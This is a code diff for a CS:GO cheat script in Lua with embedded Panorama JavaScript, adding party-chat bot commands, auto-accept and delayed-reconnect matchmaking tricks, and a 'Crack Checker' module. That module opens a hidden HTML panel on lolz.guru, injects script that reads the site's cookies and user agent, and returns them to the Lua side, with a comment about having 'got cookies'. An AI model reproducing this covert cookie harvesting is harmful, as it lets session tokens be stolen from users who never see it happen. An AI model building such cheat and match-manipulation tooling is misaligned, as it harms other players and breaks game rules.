+									if ( ModXUID && FoundIndex != -1 ) {
+										let FriendSteam = UserData.mods[FoundIndex];
+										let FriendName = FriendsListAPI.GetFriendName(FriendSteam);
+										Utilities.SayParty(`Removed ${FriendName} (${FriendSteam}) as a moderator!`);
+										delete UserData.mods[ FoundIndex ];
+									}
+								} else {
+									let FriendSteam = UserData.mods[ parseInt(args[1]) ];
+									let FriendName = FriendsListAPI.GetFriendName(FriendSteam);
+									Utilities.SayParty(`Removed ${FriendName} (${FriendSteam}) as a moderator!`);
+									delete UserData.mods[ parseInt(args[1]) ];
+								}
+							}
+							break;
+						case 'clear':
+							let TotalMods = UserData.mods.length || 0
+							Utilities.SayParty(`Cleared ${TotalMods} records (incl removed and existing mods)!`);
+							UserData.mods = [null];
+							break;
+						default:
+							if ( typeof args[0] != 'undefined' ) {
+								let ModXUID = Utilities.FindPlayer(args[0]);
+								if ( ModXUID && ModXUID != MySteamID ) {
+									if ( UserData.mods.indexOf(ModXUID) == -1 ) {
+										UserData.mods.push(ModXUID);
+										let FriendName = FriendsListAPI.GetFriendName(ModXUID);
+										Utilities.SayParty(`Added ${FriendName} (${ModXUID}) as a moderator!`);
+									} else {
+										let FoundIndex = UserData.mods.indexOf(ModXUID);
+										if ( FoundIndex != -1 ) {
+											let FriendSteam = UserData.mods[FoundIndex];
+											let FriendName = FriendsListAPI.GetFriendName(FriendSteam);
+											Utilities.SayParty(`Removed ${FriendName} (${FriendSteam}) as a moderator!`);
+											delete UserData.mods[ FoundIndex ];
+										}
+									}
+								} else if ( ModXUID == MySteamID ) {
+									Utilities.SayParty(`Nope! You cannot add yourself to the moderator!`)
+								} else {
+									Utilities.SayParty(`Sorry! I don't know how to decipher: ${args[0]}`)
+								}
+							}
+					}                
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Blacklist (!\u{200B}blacklist <partial:name>|<steamid>|<friendcode>|<lobbyindex>)',
+			helpTitle: 'Type "!blacklist add <PartialName>", "!blacklist add <SteamID64>", "!blacklist add <FriendCode>", "!blacklist add <LobbyIndex>"',
+			helpExamples: 'Typing "!blacklist add 2" will blacklist the second person in the lobby, others are pretty easy like "!blacklist add csmit"!',
+			cmds: ['blacklist', 'bl'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( steamid == MyPersonaAPI.GetXuid() ) {
+					UserData.blacklist = UserData.blacklist || [0];
+					switch(args[0]) {
+						case 'add':
+							if ( typeof args[1] != 'undefined' ) {
+								let BlacklistXUID = Utilities.FindPlayer(args[1]);
+								if ( BlacklistXUID && BlacklistXUID != MySteamID ) {
+									if ( UserData.blacklist.indexOf(BlacklistXUID) == -1 ) {
+										UserData.blacklist.push(BlacklistXUID);
+										let FriendName = FriendsListAPI.GetFriendName(BlacklistXUID);
+										Utilities.SayParty(`Added ${FriendName} (${BlacklistXUID}) to blacklist!`);
+									} else {
+										let FriendName = FriendsListAPI.GetFriendName(BlacklistXUID);
+										Utilities.SayParty(`Cannot add ${FriendName}(${BlacklistXUID}) to blacklist!`)
+									}
+								} else if ( BlacklistXUID == MySteamID ) {
+									Utilities.SayParty(`Nope! You cannot add yourself to the blacklist!`)
+								} else {
+									Utilities.SayParty(`Sorry! I don't know how to decipher: ${args[1]}`)
+								}
+							}
+							break;
+						case 'list':
+							UserData.blacklist.forEach((steamid, index)=>{
+								if ( steamid ) {
+									let FriendName = FriendsListAPI.GetFriendName(steamid);
+									Utilities.SayParty(`[${index}] ${FriendName} - ${steamid}`);
+								}
+							})
+							break;
+						case 'remove':
+							if ( typeof args[1] != 'undefined' ) {
+								if ( typeof UserData.blacklist[ parseInt(args[1]) ] == 'undefined' ) {
+									let BlacklistXUID = Utilities.FindPlayer(args[1]);
+									let FoundIndex = UserData.blacklist.indexOf(BlacklistXUID);
+									if ( BlacklistXUID && FoundIndex != -1 ) {
+										let FriendSteam = UserData.blacklist[FoundIndex];
+										let FriendName = FriendsListAPI.GetFriendName(FriendSteam);
+										Utilities.SayParty(`Removed ${FriendName} (${FriendSteam}) from blacklist!`);
+										delete UserData.blacklist[ FoundIndex ];
+									}
+								} else {
+									let FriendSteam = UserData.blacklist[ parseInt(args[1]) ];
+									let FriendName = FriendsListAPI.GetFriendName(FriendSteam);
+									Utilities.SayParty(`Removed ${FriendName} (${FriendSteam}) from blacklist!`);
+									delete UserData.blacklist[ parseInt(args[1]) ];
+								}
+							}
+							break;
+						case 'clear':
+							let TotalBlacklist = UserData.blacklist.length || 0
+							Utilities.SayParty(`Cleared ${TotalBlacklist} records (incl removed and existing blacklists)!`);
+							UserData.blacklist = [0];
+							break;
+						default:
+							if ( typeof args[0] != 'undefined' ) {
+								let BlacklistXUID = Utilities.FindPlayer(args[0]);
+								if ( BlacklistXUID && BlacklistXUID != MySteamID ) {
+									if ( UserData.blacklist.indexOf(BlacklistXUID) == -1 ) {
+										UserData.blacklist.push(BlacklistXUID);
+										let FriendName = FriendsListAPI.GetFriendName(BlacklistXUID);
+										Utilities.SayParty(`Added ${FriendName} (${BlacklistXUID}) to blacklist!`);
+									} else {
+										let FoundIndex = UserData.blacklist.indexOf(BlacklistXUID);
+										if ( FoundIndex != -1 ) {
+											let FriendSteam = UserData.blacklist[FoundIndex];
+											let FriendName = FriendsListAPI.GetFriendName(FriendSteam);
+											Utilities.SayParty(`Removed ${FriendName} (${FriendSteam}) from blacklist!`);
+											delete UserData.blacklist[ FoundIndex ];
+										}
+									}
+								} else if ( BlacklistXUID == MySteamID ) {
+									Utilities.SayParty(`Nope! You cannot add yourself to the blacklist!`)
+								} else {
+									Utilities.SayParty(`Sorry! I don't know how to decipher: ${args[1]}`)
+								}
+							}
+					}                
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Invite (!\u{200B}invite <steamid>|<friendcode>)',
+			cmds: ['inv', 'invite', 'add'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+
+				Utilities.FindPlayer(args[0], false, (steamid)=>{
+					FriendsListAPI.ActionInviteFriend(steamid, '')
+				})
+			}
+		});
+		PartyChatCommands.push({
+			title: 'WhoInvited (!\u{200B}who <steamid>|<friendcode>)',
+			cmds: ['who', 'whoinv', 'whoinvite', 'whoinvited'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+
+				let XUID = 0;
+				if ( typeof args[0] != 'undefined' ) {
+					XUID = Utilities.FindPlayer(args[0])
+				}
+
+				if ( XUID != 0 ) {
+					let LobbyData = LobbyAPI.GetSessionSettings()
+					for ( i=0; i<LobbyData.members.numMachines; i++ ) {
+						let Machine = LobbyData.members[`machine${i}`]
+						if ( Machine && XUID == Machine.id ) {
+							let jfriend = Machine['player0'].game.jfriend
+							let jfriendName = FriendsListAPI.GetFriendName(jfriend);
+							let friendName = FriendsListAPI.GetFriendName(XUID);
+							if ( jfriend ) {		
+								Utilities.SayParty(`${friendName} was invited by ${jfriendName} (${jfriend})!`);
+							} else {
+								Utilities.SayParty(`Couldn't find who invited ${friendName}!`);
+							}
+						}
+					}
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Mute (!\u{200B}mute <steamid>|<friendcode>)',
+			cmds: ['mute', 'm', 'quiet', 'silence', 'ignore', 'block'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+
+				let XUID = 0;
+				if ( typeof args[0] != 'undefined' ) {
+					XUID = Utilities.FindPlayer(args[0])
+				}
+
+				if ( XUID != 0 ) {
+					let friendName = FriendsListAPI.GetFriendName(XUID);
+					MuteUsers.push(XUID);
+					Utilities.SayParty(`${friendName} is now muted!`);
+				}
+			}
+		});
+		PartyChatCommands.push({
+			title: 'Ping (!\u{200B}ping <ping> [ <target> ] or !ping)',
+			cmds: ['ping', 'maxping', 'p'],
+			exec: (cmd, args, sender, steamid) => {
+				if ( Utilities.IsBlacklisted(steamid) ) return;
+				let BaseCMD = 'mm_dedicated_search_maxping'
+				let MyPing = GameInterfaceAPI.GetSettingString(BaseCMD);
+
+				if ( /((?:\d\s){3}\d)/.test(MyPing) ) {
+					MyPing = '> 1000'
+				} else {
+					MyPing = '< ' + Math.trunc(MyPing)
+				}
+
+				switch (args.length) {
+					case 0:
+						// Print current ping
+						Utilities.SayParty(`[PING] My ping is: ${MyPing}`);
+						break;
+					case 1:
+						// Set Ping to Arg0
+						let RequestedPing = Math.trunc(args[0]);
+						if ( RequestedPing == '0' ) {
+							RequestedPing = '0 0 0 4'
+						}
+						GameInterfaceAPI.ConsoleCommand(`${BaseCMD} ${RequestedPing}`)
+						Utilities.SayParty(`[PING] I set ping to: ${RequestedPing}`);
+						break;
+					case 2:
+						// If Arg1 == Me, set Ping to Arg0
+						let XUID = Utilities.FindPlayer(args[1]);
+						if ( XUID != 0 && XUID == MySteamID ) {
+							let RequestedPing = Math.trunc(args[0]);
+							if ( RequestedPing == '0' ) {
+								RequestedPing = '0 0 0 4'
+							}
+							GameInterfaceAPI.ConsoleCommand(`${BaseCMD} ${RequestedPing}`)
+							Utilities.SayParty(`[PING] I set ping to: ${RequestedPing}`);
+						}
+						break;
+				}
+			}
+		});
+
+		// Ignore Initial Chat
+		let PreprocessChat = () => {
+			let party_chat = $.GetContextPanel().FindChildTraverse("PartyChat")
+			if(party_chat) {
+				let chat_lines = party_chat.FindChildTraverse("ChatLinesContainer")
+				if(chat_lines) {
+					chat_lines.Children().reverse().forEach(el => {
+						let child = el.GetChild(0)
+						if ( child && child.BHasClass('left-right-flow') && child.BHasClass('horizontal-align-left') ) {
+							if ( child.GetChildCount() == 2 ) {
+								MsgSteamID = child.Children()[0].steamid;
+							}
+							if ( !child.BHasClass('cp_processed') ) {
+								child.AddClass('cp_processed');
+							}
+						}
+					})
+				}
+			}
+		}
+		PreprocessChat();
+
+		let ProcessChat = false;
+		let Shutdown = false;
+		let Timeouts = [];
+		let PartyChatLoop = ()=>{
+			let party_chat = $.GetContextPanel().FindChildTraverse("PartyChat")
+			if(party_chat) {
+				let chat_lines = party_chat.FindChildTraverse("ChatLinesContainer")
+				if(chat_lines) {
+					chat_lines.Children().forEach(el => {
+						let child = el.GetChild(0)
+						if ( child && child.BHasClass('left-right-flow') && child.BHasClass('horizontal-align-left') ) {
+							try {
+								if ( child.BHasClass('cp_processed') ) return false;
+						
+								let InnerChild = child.GetChild(child.GetChildCount()-1);
+								if ( InnerChild && InnerChild.text ) {
+									let Sender = $.Localize('{s:player_name}', InnerChild);
+									let Message = $.Localize('{s:msg}', InnerChild);
+								
+									//var Message = InnerChild.text.toLowerCase()
+									
+									if (!Message.startsWith(Prefix)) return;
+
+									if ( child.GetChildCount() == 2 ) {
+										MsgSteamID = child.Children()[0].steamid;
+									}
+
+									if ( MuteUsers.includes(MsgSteamID) ) {
+										return el.RemoveAndDeleteChildren();
+									}
+
+									const args = Message.slice(Prefix.length).trim().split(' ');
+									const command = args.shift().toLowerCase();
+
+									for ( index=0; index < PartyChatCommands.length; index++ ) {
+										const ChatCommand = PartyChatCommands[index];
+										for ( i=0; i<ChatCommand.cmds.length; i++ ) {
+											const Alias = ChatCommand.cmds[i]; 
+											if ( Alias == command ) {
+												if ( ChatCommand.timeout ) {
+													if ( Timeouts[ChatCommand] && Date.now() <= Timeouts[ChatCommand] ) {
+														break;
+													} else {
+														Timeouts[ChatCommand] = Date.now() + ChatCommand.timeout
+													}
+												}
+												ChatCommand.exec(command, args, Sender, MsgSteamID)
+												break;
+											}
+										}
+									}
+								}
+							} catch(err) {
+								$.Msg('CSLua: Error (probably irrelevent) ', err);
+							}
+							if ( child ) child.AddClass('cp_processed');
+						}
+					})
+				}
+			}	
+		}
+
+		return {
+			PartyChatLoop: ()=>{
+				PartyChatLoop();
+			},
+			GetUserData: ()=>{
+				return JSON.stringify(UserData);
+			},
+			SetUserData: (data)=>{
+				UserData = JSON.parse(data);
+				UserData.mods = typeof UserData.mods == 'undefined' ? [] : Object.values(UserData.mods);
+				UserData.blacklist = typeof UserData.blacklist == 'undefined' ? [] : Object.values(UserData.blacklist);
+			},
+			PreviousMessage: ()=>{
+				let elInput = $.GetContextPanel().FindChildTraverse('ChatInput');
+				if ( elInput && Utilities.MessageHistory.length > 0 && Utilities.MessageIndex > 0 ) {
+					if ( elInput.BHasKeyFocus() ) {
+						elInput.text = Utilities.MessageHistory[Utilities.MessageIndex-- - 1];
+					} else {
+						Utilities.MessageIndex = Utilities.MessageHistory.length;
+					}
+				}
+			},
+			NextMessage: ()=>{
+				let elInput = $.GetContextPanel().FindChildTraverse('ChatInput');
+				if ( elInput && Utilities.MessageHistory.length > 0 && Utilities.MessageIndex < Utilities.MessageHistory.length - 1 ) {
+					if ( elInput.BHasKeyFocus() ) {
+						elInput.text = Utilities.MessageHistory[Utilities.MessageIndex++ + 1];
+					} else {
+						Utilities.ClearMessageIndex();
+					}
+				}
+			},
+			ClearMessageIndex: Utilities.ClearMessageIndex
+		}
+	]], 'CSGOMainMenu')();
+	--#endregion
+
+	--#region Lolz Checker Library
+	if ( Feature.get('Crack Checker') ) then
+		LolzPanorama = panorama.loadstring([[
+			var html
+			var finish_handler
+			var alert_handler
+			var data
+
+			var page_script = `
+				function setCookie(name,value,days) {
+					var expires = "";
+					if (days) {
+						var date = new Date();
+						date.setTime(date.getTime() + (days*24*60*60*1000));
+						expires = "; expires=" + date.toUTCString();
+					}
+					document.cookie = name + "=" + (value || "")  + expires + "; path=/";
+				}
+				
+				setCookie('xf_market_currency','usd',7);
+				
+				var data = {
+					cookie: document.cookie,
+					user_agent: navigator.userAgent
+				}
+				alert(JSON.stringify(data));
+			`
+
+			var _Create = function() {
+				if(html != null) {
+					return
+				}
+
+				html = $.CreatePanel("HTML", $.GetContextPanel(), "", {
+					url: "https://lolz.guru/",
+					acceptsinput: "false",
+					acceptsfocus: "false",
+					mousetracking: "false",
+					focusonhover: "false",
+					width: "100px",
+					height: "100px",
+				})
+				html.visible = false
+
+				finish_handler = $.RegisterEventHandler("HTMLFinishRequest", html, function(a, url, title){
+					if(url == "https://lolz.guru/"){
+						html.RunJavascript(page_script)
+					}
+				});
+
+				alert_handler = $.RegisterEventHandler("HTMLJSAlert", html, function(id, alert_text){
+					if(html != null && id == html.id) {
+						try {
+							data = JSON.parse(alert_text)
+
+							html.RunJavascript('document.cookie = `df_id=; domain=lolz.guru; path=/; max-age=0; xf_market_currency=usd;`;')
+
+							// we got cookies, clean up everything
+							_Destroy()
+						} catch(err) {
+							// silently ignore
+						}
+					}
+				});
+
 			}
 
-			function LiveCheck.buildRichPresence(arg_4_0)
-				return {
-					version = var_0_17.GetFriendRichPresence(arg_4_0, "version"),
-					status = var_0_17.GetFriendRichPresence(arg_4_0, "status"),
-					state = var_0_17.GetFriendRichPresence(arg_4_0, "game:state"),
-					gamemode = var_0_17.GetFriendRichPresence(arg_4_0, "game:mode"),
-					mapgroupname = var_0_17.GetFriendRichPresence(arg_4_0, "game:mapgroupname"),
-					map = var_0_17.GetFriendRichPresence(arg_4_0, "game:map")
+			var _Destroy = function() {
+				if(finish_handler != null) {
+					$.UnregisterEventHandler("HTMLFinishRequest", html, finish_handler)
+					finish_handler = null
 				}
+
+				if(alert_handler != null) {
+					$.UnregisterEventHandler("HTMLJSAlert", html, alert_handler)
+					alert_handler = null
+				}
+
+				if(html != null) {
+					html.DeleteAsync(0.0)
+					html = null
+				}
+			}
+
+			// just to return the data back to lua
+			var _GetData = function() {
+				return data
+			}
+
+			return {
+				create: _Create,
+				destroy: _Destroy,
+				get_data: _GetData
+			}
+		]], "CSGOMainMenu")()
+	end
+	--#endregion
+
+	--#region ReconnectBtn Library
+	ReconnectBtn = panorama.loadstring([[
+		var btnReconnect = $.GetContextPanel().FindChildTraverse( 'MatchmakingReconnect' );
+
+		return {
+			set:(text)=>{btnReconnect.text = text},
+			reset:()=>{btnReconnect.text = 'RECONNECT'},
+			get:()=>btnReconnect.text
+		}
+	]], 'CSGOMainMenu')()
+
+	--#endregion
+
+	--#region LiveCheck Library
+	if ( Feature.get('LiveCheck Library') ) then
+		client.delay_call(0, function()
+			-- LOL SAPH DONT BULLY ME, I know you see what code was here. Fuck me.
+			LiveCheck = { datawaiting = {}, agecheck = {}, dataready = {} }
+
+			function LiveCheck.buildRichPresence(steamid)
+				local RichPresence = {}
+				RichPresence.version = ISteamFriends.GetFriendRichPresence(steamid, 'version')
+				RichPresence.status = ISteamFriends.GetFriendRichPresence(steamid, 'status')
+				RichPresence.state = ISteamFriends.GetFriendRichPresence(steamid, 'game:state')
+				RichPresence.gamemode = ISteamFriends.GetFriendRichPresence(steamid, 'game:mode')
+				RichPresence.mapgroupname = ISteamFriends.GetFriendRichPresence(steamid, 'game:mapgroupname')
+				RichPresence.map = ISteamFriends.GetFriendRichPresence(steamid, 'game:map')
+				return RichPresence
 			end
 
-			function LiveCheck.start(arg_5_0, arg_5_1, arg_5_2)
-				if not arg_5_1 then
-					return
-				end
+			function LiveCheck:start(_steamid, callback)
+				if not _steamid then return end
 
-				local var_5_0 = tostring(arg_5_1)
-				local var_5_1 = var_0_17.GetFriendRichPresenceKeyCount(var_5_0) > 0 and LiveCheck.buildRichPresence(var_5_0) or false
+				local steamid = tostring(_steamid)
+				local PresenceCount = ISteamFriends.GetFriendRichPresenceKeyCount(steamid)
+				local RichPresence = PresenceCount > 0 and LiveCheck.buildRichPresence(steamid) or false
 
-				LiveCheck.datawaiting[var_5_0] = true
+				LiveCheck.datawaiting[steamid] = true
 
-				var_0_17.RequestFriendRichPresence(var_5_0)
+				ISteamFriends.RequestFriendRichPresence(steamid)
+
 				client.delay_call(5, function()
-					arg_5_2(var_5_0, LiveCheck.dataready[var_5_0] or var_5_1)
+					callback(steamid, LiveCheck.dataready[steamid] or RichPresence)
 				end)
 			end
 
-			var_0_3.set_callback("FriendRichPresenceUpdate_t", function(arg_7_0)
-				local var_7_0 = arg_7_0.m_steamIDFriend:render_steam64()
-
-				if LiveCheck.datawaiting[var_7_0] then
-					LiveCheck.dataready[var_7_0] = LiveCheck.buildRichPresence(var_7_0)
-					LiveCheck.datawaiting[var_7_0] = false
+			-- Register Callbacks
+			steamworks.set_callback('FriendRichPresenceUpdate_t', function(e)
+				local steamid = e.m_steamIDFriend:render_steam64()
+				if ( LiveCheck.datawaiting[steamid] ) then
+					LiveCheck.dataready[steamid] = LiveCheck.buildRichPresence(steamid)
+					LiveCheck.datawaiting[steamid] = false
 				end
 			end)
 
-			LiveCheck.panorama = panorama.loadstring("\t\t\t\tLiveCheck = {queue:[], waiting:{}}\n\t\t\t\tLiveCheck.start = (steamid, callback) => {\n\t\t\t\t\tLiveCheck.waiting[steamid] = callback\n\t\t\t\t\tLiveCheck.queue[LiveCheck.queue.length + 1] = steamid\n\t\t\t\t}\n\n\t\t\t\tfunction _getQueue(){\n\t\t\t\t\tlet Queue = LiveCheck.queue;\n\t\t\t\t\tLiveCheck.queue = [];\n\t\t\t\t\treturn Queue;\n\t\t\t\t}\n\n\t\t\t\tfunction _finished(steamid, data){\n\t\t\t\t\tif ( typeof LiveCheck.waiting[steamid] != 'undefined' ) {\n\t\t\t\t\t\tLiveCheck.waiting[steamid](data);\n\t\t\t\t\t\tdelete LiveCheck.waiting[steamid];\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\treturn  {\n\t\t\t\t\tgetQueue: _getQueue,\n\t\t\t\t\tfinished: _finished\n\t\t\t\t}\n\t\t\t", "CSGOMainMenu")()
+			-- Panorama Access
+			LiveCheck.panorama = panorama.loadstring([[
+				LiveCheck = {queue:[], waiting:{}}
+				LiveCheck.start = (steamid, callback) => {
+					LiveCheck.waiting[steamid] = callback
+					LiveCheck.queue[LiveCheck.queue.length + 1] = steamid
+				}
+
+				function _getQueue(){
+					let Queue = LiveCheck.queue;
+					LiveCheck.queue = [];
+					return Queue;
+				}
+
+				function _finished(steamid, data){
+					if ( typeof LiveCheck.waiting[steamid] != 'undefined' ) {
+						LiveCheck.waiting[steamid](data);
+						delete LiveCheck.waiting[steamid];
+					}
+				}
+
+				return  {
+					getQueue: _getQueue,
+					finished: _finished
+				}
+			]], 'CSGOMainMenu')()
 
 			function LiveCheck.loop()
-				if not LiveCheck.panorama.getQueue then
-					return
-				end
-
-				local var_8_0 = LiveCheck.panorama.getQueue()
-
-				if var_8_0.length > 0 then
-					for iter_8_0 = 0, var_8_0.length - 1 do
-						local var_8_1 = var_8_0[iter_8_0]
-
-						if var_8_1 then
-							LiveCheck:start(var_8_1, function(arg_9_0, arg_9_1)
-								LiveCheck.panorama.finished(arg_9_0, arg_9_1)
+				local Queue = LiveCheck.panorama.getQueue()
+				if ( Queue.length > 0 ) then
+					for i=0, Queue.length-1 do
+						local SteamID = Queue[i]
+						if ( SteamID ) then
+							LiveCheck:start(SteamID, function(steamid, data)
+								LiveCheck.panorama.finished(steamid, data)
 							end)
 						end
 					end
 				end
-
 				client.delay_call(0.5, LiveCheck.loop)
 			end
-
 			LiveCheck.loop()
 		end)
 	end
+	--#endregion
 
-	Date = panorama.loadstring("return [ts => new Date(ts * 1000)]")()[0]
+	-- Too clean to put in one of the above panoramas, looks sexy AF
+	Date = panorama.loadstring('return [ts => new Date(ts * 1000)]')()[0]
 end
+--#endregion
 
 function Initiate()
-	local var_10_0 = {
-		loops = {},
-		ChatMethods = {
-			["Local Chat"] = function(arg_11_0)
-				cp_SendChat(arg_11_0)
-			end,
-			["Party Chat"] = function(arg_12_0)
-				var_0_12.SessionCommand("Game::Chat", string.format("run all xuid %s chat %s", var_0_13.GetXuid(), arg_12_0:gsub(" ", " ")))
-			end,
-			["Game Chat"] = function(arg_13_0)
-				MessageQueue:Say(arg_13_0)
-			end,
-			["Team Chat"] = function(arg_14_0)
-				MessageQueue:SayTeam(arg_14_0)
-			end,
-			Console = function(...)
-				print(...)
-			end
-		},
-		Header = ui.new_label("Lua", "B", "=========  [   $CP Start   ]  =========")
+	local CPLua = {loops = {}}
+
+	CPLua.ChatMethods = {
+		['Local Chat'] = function(msg)
+			cp_SendChat(msg)
+		end,
+		['Party Chat'] = function(msg)
+			PartyListAPI.SessionCommand('Game::Chat', string.format('run all xuid %s chat %s', MyPersonaAPI.GetXuid(), msg:gsub(' ', ' ')))
+		end,
+		['Game Chat'] = function(msg)
+			local Sanitized = msg
+			MessageQueue:Say(msg)
+		end,
+		['Team Chat'] = function(msg)
+			MessageQueue:SayTeam(msg)
+		end,
+		['Console'] = function(...)
+			print(...)
+		end
 	}
 
-	if var_0_18.get("Delayed Auto Accept") then
-		var_10_0.AutoAccept = {}
-		var_10_0.AutoAccept.originalAutoAccept = ui.reference("MISC", "Miscellaneous", "Auto-accept matchmaking")
-		var_10_0.AutoAccept.enable = ui.new_checkbox("Lua", "B", "Delayed Auto Accept")
-		var_10_0.AutoAccept.delay = ui.new_slider("Lua", "B", "\nAuto Accept Delay", 1, 21, 3, true, "s")
+	CPLua.Header = ui.new_label('Lua', 'B', '=========  [   $CP Start   ]  =========')
+	
+	--#region Delayed Auto Accept
+	if ( Feature.get('Delayed Auto Accept') ) then
+		CPLua.AutoAccept = {}
+		CPLua.AutoAccept.originalAutoAccept = ui.reference('MISC', 'Miscellaneous', 'Auto-accept matchmaking')
+		CPLua.AutoAccept.enable = ui.new_checkbox('Lua', 'B', 'Delayed Auto Accept')
+		CPLua.AutoAccept.delay = ui.new_slider('Lua', 'B', '\nAuto Accept Delay', 1, 21, 3, true, 's')
 
-		ui.set_visible(var_10_0.AutoAccept.delay, false)
-		ui.set_callback(var_10_0.AutoAccept.enable, function(arg_16_0)
-			local var_16_0 = ui.get(arg_16_0)
+		ui.set_visible(CPLua.AutoAccept.delay, false)
 
-			ui.set_visible(var_10_0.AutoAccept.delay, var_16_0)
-
-			if var_16_0 then
-				ui.set(var_10_0.AutoAccept.originalAutoAccept, not var_16_0)
+		ui.set_callback(CPLua.AutoAccept.enable, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.AutoAccept.delay, Status)
+			
+			if ( Status ) then
+				ui.set(CPLua.AutoAccept.originalAutoAccept, not Status)
 			end
 		end)
-		ui.set_callback(var_10_0.AutoAccept.originalAutoAccept, function(arg_17_0)
-			if ui.get(arg_17_0) then
-				ui.set(var_10_0.AutoAccept.enable, false)
+		ui.set_callback(CPLua.AutoAccept.originalAutoAccept, function(self)
+			if ( ui.get(self) ) then
+				ui.set(CPLua.AutoAccept.enable, false)
 			end
 		end)
 
-		local var_10_1 = false
+		local AutoAcceptReady
+		panorama_events.register_event('ShowAcceptPopup', function(data)
+			AutoAcceptReady = true
+			-- print('ShowAcceptPopup')
+		end)
 
-		var_0_4.register_event("ShowAcceptPopup", function(arg_18_0)
-			if not ui.get(var_10_0.AutoAccept.enable) then
-				return
+		panorama_events.register_event('CloseAcceptPopup', function(data)
+			AutoAcceptReady = false
+			-- print('CloseAcceptPopup')
+		end)
+
+		panorama_events.register_event('PanoramaComponent_Lobby_ReadyUpForMatch', function(data)
+			if ( ui.get(CPLua.AutoAccept.enable) ) then
+				client.delay_call(ui.get(CPLua.AutoAccept.delay), function()
+					LobbyAPI.SetLocalPlayerReady('accept')
+				end)
 			end
-
-			if var_10_1 and var_10_1.active then
-				var_10_1:delete()
-			end
-
-			var_10_1 = Timer.set(ui.get(var_10_0.AutoAccept.delay), function()
-				print("ACCEPT")
-				var_0_14.SetLocalPlayerReady("accept")
-			end)
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Delayed Connect") then
-		var_10_0.DelayedConnect = {}
-		var_10_0.DelayedConnect.enable = ui.new_checkbox("Lua", "B", "Delayed Connect")
-		var_10_0.DelayedConnect.delay = ui.new_slider("Lua", "B", "\nDelayed Connect Delay", 30, 415, 120, true, "s")
+	--#region Delayed Connect
+	if ( Feature.get('Delayed Connect') ) then
+		CPLua.DelayedConnect = {}
+		CPLua.DelayedConnect.enable = ui.new_checkbox('Lua', 'B', 'Delayed Connect')
+		CPLua.DelayedConnect.delay = ui.new_slider('Lua', 'B', '\nDelayed Connect Delay', 30, 415, 120, true, 's')
 
-		ui.set_visible(var_10_0.DelayedConnect.delay, false)
-		ui.set_callback(var_10_0.DelayedConnect.enable, function(arg_20_0)
-			local var_20_0 = ui.get(arg_20_0)
+		ui.set_visible(CPLua.DelayedConnect.delay, false)
 
-			ui.set_visible(var_10_0.DelayedConnect.delay, var_20_0)
+		ui.set_callback(CPLua.DelayedConnect.enable, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.DelayedConnect.delay, Status)
 		end)
 
-		local var_10_2 = false
-		local var_10_3 = false
-		local var_10_4 = false
-
-		var_0_4.register_event("ShowAcceptPopup", function(arg_21_0)
-			if not ui.get(var_10_0.DelayedConnect.enable) then
-				return
+		client.set_event_callback('player_connect_full', function(e)
+			if ( CPLua.DelayedConnect.once and client.userid_to_entindex(e.userid) == entity.get_local_player() and ui.get(CPLua.DelayedConnect.enable) and CompetitiveMatchAPI.HasOngoingMatch() ) then
+				client.exec('disconnect')
+				CPLua.DelayedConnect.once = false
+				LobbyAPI.CloseSession()
 			end
 
-			var_10_2 = 0
-
-			print("Count = ", var_10_2)
-
-			if var_10_4 and var_10_4.active then
-				var_10_4:delete()
+			if ( not CPLua.DelayedConnect.once ) then
+				ReconnectBtn.reset()
 			end
 		end)
-		client.set_event_callback("player_connect_full", function(arg_22_0)
-			if not var_10_2 then
-				return
+
+		panorama_events.register_event('ShowAcceptPopup', function(data)
+			CPLua.DelayedConnect.FirstJoin = true
+			CPLua.DelayedConnect.SecondJoin = false
+			CPLua.DelayedConnect.once = true
+		end)
+
+		panorama_events.register_event('QueueConnectToServer', function(data)
+			if ( not CPLua.DelayedConnect.FirstJoin and not CPLua.DelayedConnect.SecondJoin ) then
+				CPLua.DelayedConnect.SecondJoin = true
 			end
 
-			if not var_0_8.HasOngoingMatch() then
-				return
-			end
+			if ( CPLua.DelayedConnect.FirstJoin and ui.get(CPLua.DelayedConnect.enable) and CompetitiveMatchAPI.HasOngoingMatch() ) then
+				CPLua.DelayedConnect.FirstJoin = false
+				CPLua.DelayedConnect.SecondJoin = false
 
-			local var_22_0 = ui.get(var_10_0.DelayedConnect.delay)
+				local Delay = ui.get(CPLua.DelayedConnect.delay)
+				local index = 1
 
-			var_10_2 = var_10_2 + 1
+				function UpdateLoop()
+					ReconnectBtn.set('RECONNECT (' .. Delay - index .. ')')
+					index = index + 1
 
-			print("Count = ", var_10_2)
+					if Delay - index == 0 and ui.get(CPLua.DelayedConnect.enable) and not GameStateAPI.IsConnectedOrConnectingToServer() then
+						CPLua.DerankScore.Reconnect()
+					end
 
-			if var_10_2 == 1 then
-				client.exec("disconnect")
-				print("disconnecting, starting timer")
-
-				var_10_4 = Timer.set(var_22_0, function()
-					ReconnectBtn.set("RECONNECT")
-					var_10_0.DerankScore.Reconnect()
-					print("Timer Done!")
-				end)
-
-				local function var_22_1()
-					if var_10_4.active then
-						ReconnectBtn.set("RECONNECT (" .. math.floor(var_10_4:remaining()) .. ")")
-						client.delay_call(1, var_22_1)
+					if ui.get(CPLua.DelayedConnect.enable) and Delay - index > 0 and not CPLua.DelayedConnect.SecondJoin then
+						client.delay_call(1, UpdateLoop)
+					else
+						ReconnectBtn.set('RECONNECT')
 					end
 				end
-
-				var_22_1()
-				var_0_14.CloseSession()
-			elseif var_10_2 == 2 then
-				var_10_4:delete()
-				ReconnectBtn.set("RECONNECT")
-
-				var_10_2 = false
+				client.delay_call(1, UpdateLoop)	
+			elseif ( not CPLua.DelayedConnect.FirstJoin ) then
+				ReconnectBtn.set('RECONNECT')
 			end
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Auto Accept Detection") then
-		var_10_0.AutoAcceptDetection = {}
